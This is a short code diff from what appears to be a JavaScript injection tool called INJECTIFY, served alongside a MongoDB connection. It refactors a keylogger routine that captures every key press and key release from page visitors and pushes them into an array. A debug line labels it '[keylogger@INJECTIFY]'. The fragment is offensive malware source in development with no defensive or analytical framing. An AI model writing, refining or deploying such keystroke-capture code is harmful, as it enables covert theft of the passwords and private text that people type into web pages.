@@ -973,12 +973,11 @@ MongoClient.connect(config.mongodb, function(err, db) {
 					function b(n) {` + comment("if the key type ends with p => then it's keyup") + `
 						var l = '',
 							h = n.key
-						if(!h) return
 						if (n.type.slice(-1) == 'p') l = '_'
 						var z = h + l` + comment("ignore multiple modifier calls") + `
-						if (m == z) return` + comment("Push to array") + `
+						if (m == z || !h) return` + comment("Push to array") + `
 						f.push(z)` + comment("return function and update the value of the last m(odifier) key press") + `
-						if (n.key && n.key.length > 1) m = z
+						if (h.length > 1) m = z
 						` + debug(`
 							if (n.key && n.key.length > 1) {
 								console.log('%c[keylogger@INJECTIFY] %cModifier key state changed', 'color: #ef5350; font-weight: bold', 'color: #FF9800', n)
